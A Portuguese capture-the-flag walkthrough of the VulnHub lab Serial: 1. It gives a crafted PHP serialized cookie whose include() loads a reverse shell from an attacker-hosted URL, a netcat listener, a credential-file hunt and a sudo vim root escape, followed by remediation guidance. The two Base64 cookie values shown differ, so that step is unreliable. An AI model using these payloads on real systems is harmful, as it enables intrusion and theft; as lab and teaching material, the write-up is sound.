# Serial: 1 — Desserializar, Incluir, Executar, Escalar

Bora rapaziada!! Essa máquina é um laboratório puro de desserialização PHP e é uma das melhores caixas focadas em exploração para entender a cadeia completa de ataque de desserialização. A cadeia de vulnerabilidade aqui é elegante: uma aplicação web armazena um objeto PHP serializado codificado em Base64 em um cookie, um arquivo de backup expõe o código-fonte, análise estática revela uma classe `Log` com gadget LFI no construtor, criação de um objeto serializado malicioso dispara inclusão remota de arquivo via URL controlada pelo atacante, e uma entrada sudo para `vim` entrega root via GTFOBins. Cada passo mapeia diretamente para um padrão de ataque real. Legit top demais para o seu portfólio, mano.

| Campo | Valor |
|---|---|
| **Nível** | Iniciante/Intermediário |
| **VM Alvo** | Serial: 1 |
| **VM Atacante** | Kali Linux 2024.x |
| **URL VulnHub** | https://www.vulnhub.com/entry/serial-1,440/ |
| **Técnicas** | Nmap, brute-force de diretórios, divulgação de código-fonte via backup, análise de desserialização PHP, criação de objeto Base64, RFI PHP via desserialização, reuso de credencial SSH, sudo vim GTFOBin |
| **CVEs** | CWE-502 (Desserialização de Dados Não Confiáveis), CWE-98 (Controle Inadequado de Nome de Arquivo para Include/Require em PHP) |
| **Grupos APT** | APT41: uso documentado de vulnerabilidades de desserialização PHP em ataques de aplicações web para acesso inicial no setor financeiro; FIN7: usa vulnerabilidades PHP incluindo cadeias de desserialização e LFI como vetores de acesso inicial em alvos de hospitalidade e varejo |

---

## Resumo do Ataque

```
nmap -> porta 80 (HTTP) + porta 22 (SSH)
  |
  +-- dirb -> /backup -> arquivo de código-fonte (.zip)
        |
        +-- analisar código PHP:
        |     - cookie contém Base64(serialize(objeto))
        |     - classe Log: construtor faz include($this->type_log)
        |
        +-- criar objeto Log serializado malicioso:
        |     - type_log = "http://<atacante>/shell.php"
              |
              +-- servir PHP shell no HTTP server do atacante
                    |
                    +-- setar cookie criado -> disparar desserialização -> RFI -> RCE
                          |
                          +-- reverse shell como www-data
                                |
                                +-- encontrar credentials.txt.bak -> login SSH
                                      |
                                      +-- sudo -l -> (root) NOPASSWD: /usr/bin/vim
                                            |
                                            +-- sudo vim -> :!/bin/sh -> root
                                                  |
                                                  +-- /root/flag.txt
```

---

## Metodologia

1. Nmap: identificar HTTP (80) e SSH (22)
2. Brute-force de diretórios: encontrar arquivo `/backup` com código-fonte
3. Análise estática do código PHP: identificar vulnerabilidade de desserialização e gadget LFI da classe Log
4. Criar objeto PHP serializado malicioso com URL controlada pelo atacante em `type_log`
5. Servir PHP reverse shell no HTTP server do atacante
6. Enviar cookie criado para disparar desserialização, RFI e RCE
7. Enumerar credenciais do filesystem; login SSH
8. Escalação de privilégios via sudo vim (GTFOBins)

---

## Passo 1 — Scan de Portas

```bash
sudo netdiscover -r 192.168.2.0/24
# Alvo: 192.168.2.6

nmap -p- -A 192.168.2.6
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH
80/tcp open  http    Apache
```

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Brute-Force de Diretórios e Descoberta de Backup

```bash
gobuster dir -u http://192.168.2.6/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,zip,bak \
  -t 40

# Achado chave: /backup/
```

Navegar até `/backup/` e baixar o arquivo:

```bash
wget http://192.168.2.6/backup/source.zip
unzip source.zip -d /tmp/serial_source/
```

**MITRE ATT&CK:** T1595.003 — Varredura Ativa: Varredura por Wordlist; T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Análise do Código-Fonte

Examinar o código-fonte extraído. O arquivo-chave é a aplicação PHP que lida com cookies:

```php
// Padrão vulnerável típico em index.php ou similar:
$cookie_data = base64_decode($_COOKIE['user']);
$obj = unserialize($cookie_data);
$obj->log();
```

Encontrar a definição da classe `Log`:

```php
class Log {
    public $type_log;
    
    public function __construct() {
        include($this->type_log);
    }
    
    public function log() {
        include($this->type_log);
    }
}
```

Este é o gadget. Quando `unserialize()` cria um objeto `Log`, o construtor é chamado, e `include($this->type_log)` executa. Se `type_log` contém uma URL controlada pelo atacante, isso se torna Remote File Inclusion (RFI).

**Nota real:** Vulnerabilidades de desserialização PHP (CWE-502) estão entre as principais vulnerabilidades de aplicações web. O `unserialize()` do PHP dispara chamadas de construtor e métodos mágicos em classes arbitrárias durante a reconstrução do objeto. Qualquer classe com um gadget perigoso (como uma chamada `include()`) se torna uma arma quando o atacante controla os dados serializados.

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos; T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 4 — Criar Objeto Serializado Malicioso

Escrever um script PHP para criar o objeto serializado malicioso:

```php
<?php
class Log {
    public $type_log;
}

$obj = new Log();
$obj->type_log = "http://<ip_atacante>/shell.php";

$serialized = serialize($obj);
$encoded = base64_encode($serialized);
echo $encoded;
?>
```

Executar o script:

```bash
php /tmp/craft_payload.php
# Saída (exemplo):
# TzozOiJMb2ciOjE6e3M6OToidHlwZV9sb2ciO3M6MzU6Imh0dHA6Ly8xOTIuMTY4LjIuMy9zaGVsbC5waHAiO30=
```

**MITRE ATT&CK:** T1190 — Explorar Aplicação de Face Pública; T1059.004 — Shell Unix

---

## Passo 5 — Payload RFI e Entrega de Reverse Shell

Criar a PHP reverse shell para servir da máquina atacante:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /var/www/html/shell.php
# Editar LHOST com IP do atacante e LPORT com 4444
nano /var/www/html/shell.php
```

Iniciar web server e listener netcat:

```bash
# Servidor HTTP Python
python3 -m http.server 80

# Listener netcat (terminal separado)
nc -lvnp 4444
```

Enviar o cookie malicioso para o alvo:

```bash
curl -s http://192.168.2.6/index.php \
  --cookie "user=TzozOiJMb2ciOjE6e3M4OToieXBlX2xvZyI7czozNToiaHR0cDovLzE5Mi4xNjguMi4zL3NoZWxsLnBocCI7fQ=="
```

O servidor desserializa o cookie, cria um objeto `Log`, chama `include("http://<atacante>/shell.php")`, que busca e executa a PHP reverse shell. O listener netcat recebe o callback como `www-data`.

Estabilizar o shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z -> stty raw -echo; fg -> Enter duas vezes
```

**MITRE ATT&CK:** T1059.004 — Shell Unix; T1071.001 — Protocolo de Camada de Aplicação: Protocolos Web

---

## Passo 6 — Descoberta de Credenciais e Login SSH

Enumerar o filesystem por arquivos de credenciais:

```bash
find / -name "*.bak" -o -name "*.txt" -o -name "credentials*" 2>/dev/null | grep -v proc
ls -la /home/*/
cat /home/<usuario>/credentials.txt.bak
```

Encontrar credenciais para um usuário existente. Usar para SSH para sessão mais estável:

```bash
ssh <usuario>@192.168.2.6
# Senha: credencial encontrada
```

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1552.001 — Credenciais em Arquivos; T1021.004 — Serviços Remotos: SSH

---

## Passo 7 — Escalação de Privilégios via sudo vim

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/vim
```

GTFOBins documenta a escape de shell via vim:

```bash
sudo vim -c ':!/bin/sh'
```

Root alcançado:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/flag.txt
```

Top demais, caramba! Desserialização PHP para RFI para sudo vim. Cada passo foi limpo.

**Nota real:** Editores de texto no sudo são um achado clássico de escalação de privilégios. vim, nano e emacs têm comandos de escape de shell. A documentação GTFOBins cobre todos eles. A correção é sempre remover o editor do sudoers e usar um script wrapper específico se edição de arquivos root for genuinamente necessária.

**MITRE ATT&CK:** T1548.003 — Abuso de Controle de Elevação: Sudo; T1059.004 — Shell Unix

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Crackeado/Usado |
|---|---|---|---|
| Código-fonte | Desserialização PHP + gadget LFI classe Log | /backup/source.zip | Análise estática |
| RCE | uid=33(www-data) | Desserialização RFI via cookie criado | Objeto Log serializado malicioso |
| Credencial | usuario:<senha> | /home/usuario/credentials.txt.bak | Login SSH |
| Flag root | (varia) | /root/flag.txt | sudo vim GTFOBin |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Conclusão |
|---|---|---|---|
| 1 | PHP unserialize() com dados não confiáveis (CWE-502) | Desserialização insegura é OWASP Top 10 A08:2021; explorada em grandes brechas (Yahoo, Jenkins, WebLogic) | Nunca chamar unserialize() em dados controlados pelo usuário; usar json_decode(); usar parâmetro allowed_classes |
| 2 | Arquivo de backup exposto via web server (/backup/) | Arquivos de backup no web root são fonte comum de divulgação de código-fonte; encontrado em engajamentos reais constantemente | Nunca armazenar backups em diretórios acessíveis pela web; usar armazenamento de backup fora do servidor |
| 3 | Remote File Inclusion via include() em objeto desserializado | RFI requer allow_url_include=On na config PHP; essa configuração está desabilitada por padrão mas às vezes habilitada | Auditar php.ini: garantir allow_url_include=Off, allow_url_fopen=Off em produção |
| 4 | credentials.txt.bak no diretório home do usuário | Arquivos de credenciais no filesystem são achado top em pós-exploração; devs os criam por conveniência | Enforce política de gestão de segredos; usar credential stores (HashiCorp Vault, AWS Secrets Manager) |
| 5 | sudo vim concede escape de shell root | Qualquer editor de texto com sudo NOPASSWD concede root via escape de shell | Auditar sudoers: remover editores de texto; restringir a scripts específicos com menor privilégio |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Varredura Ativa: Varredura por Wordlist | T1595.003 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação de Face Pública (desserialização PHP) | T1190 |
| Execução | Execução | Shell Unix | T1059.004 |
| Comando e Controle | C2 | Protocolo de Camada de Aplicação: Web (RFI) | T1071.001 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Controle de Elevação: Sudo (vim) | T1548.003 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Nunca chamar unserialize() em dados controlados pelo usuário:** usar json_decode(); se desserialização é obrigatória, usar `unserialize($data, ['allowed_classes' => false])`
2. **Desabilitar allow_url_include no php.ini:** definir `allow_url_include = Off` em todos os ambientes PHP; também `allow_url_fopen = Off` a menos que estritamente necessário
3. **Remover arquivos de backup do web root:** mover todos os arquivos .zip, .bak, .sql para fora do document root; implementar verificação automatizada
4. **Armazenamento seguro de credenciais:** remover arquivos de credenciais do filesystem; usar variáveis de ambiente, secrets managers (HashiCorp Vault, AWS Secrets Manager)
5. **Remover editores de texto do sudoers:** vim, nano, emacs não devem aparecer em sudo NOPASSWD; auditar com: `grep -r vim /etc/sudoers /etc/sudoers.d/`

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar uso de desserialização PHP; identificar práticas de armazenamento de backup |
| Proteger | Tecnologia Protetora | Desabilitar allow_url_include; remover backups do web root; corrigir entradas sudo |
| Proteger | Segurança de Dados | Mover credenciais para gestão de segredos; remover arquivos de credenciais do filesystem |
| Detectar | Anomalias e Eventos | Alertar em requisições HTTP externas do web server (busca RFI); monitorar novos arquivos no web root |
| Responder | Planejamento de Resposta | Remover cookies de sessão maliciosos; rotacionar todas as credenciais; patch na desserialização |
| Recuperar | Planejamento de Recuperação | Reconstruir a partir de imagem limpa; auditar todo tratamento de input PHP |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| CM-7 | Menor Funcionalidade | Desabilitar allow_url_include; desabilitar allow_url_fopen |
| AC-6 | Menor Privilégio | Remover editores de texto do sudoers; restringir sudo a scripts específicos |
| SA-11 | Testes e Avaliação de Desenvolvedor | Varredura SAST para chamadas unserialize() em dados controlados pelo usuário |
| SA-15 | Segurança do Processo de Desenvolvimento | Obrigar revisão de código para padrões de desserialização |
| CM-3 | Controle de Mudanças de Configuração | Auditar mudanças no php.ini; enforce configuração baseline segura |

### CISA KEV

Vulnerabilidades de desserialização PHP (CWE-502) estão documentadas em múltiplos advisories CISA como vetores de acesso inicial de alto impacto. CISA Alert AA22-074A lista desserialização de aplicação como técnica top usada por atores de ameaça de estado-nação e criminosos para acesso inicial a aplicações web enterprise.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Gerenciar Vulnerabilidades | MIL3 (varredura SAST para unserialize(); DAST para exploração de desserialização) |
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Configurações | MIL2 (baseline php.ini; allow_url_include=Off) |
| Gestão de Identidade e Acesso (IAM) | Gerenciar Credenciais | MIL3 (secrets manager; sem arquivos de credenciais no filesystem) |

### MITRE D3FEND

- **D3-SAOR** — Hardening de Aplicação de Software: desabilitar allow_url_include; práticas de desserialização segura
- **D3-ACH** — Hardening de Configuração de Aplicação: baseline php.ini; restrições sudo
- **D3-FIM** — Monitoramento de Integridade de Arquivo: monitorar web root e diretórios home por arquivos inesperados

---

## Considerações Finais

Serial: 1 ensina a cadeia completa de ataque de desserialização PHP de forma focada e bem estruturada. Divulgação de código-fonte leva a análise estática, leva a criação de objeto, leva a RFI, leva a shell. Depois credenciais em disco levam a SSH, e sudo vim fecha. Cada passo é educacional e diretamente aplicável a pentest real de aplicações web.

A máquina merece atenção de qualquer pessoa aprendendo segurança de aplicação. Desserialização PHP é uma classe CVE real (CWE-502 está no OWASP Top 10), o padrão de gadget RFI é real, e a escalação via editor de texto sudo é encontrada em ambientes de produção com mais frequência do que deveria.

Se você entendeu cada passo, você está pronto para enfrentar cadeias de desserialização mais complexas (Java, Python pickle, .NET). Esta é a fundação.

Thanks guys!! (❍ᴥ❍ʋ)
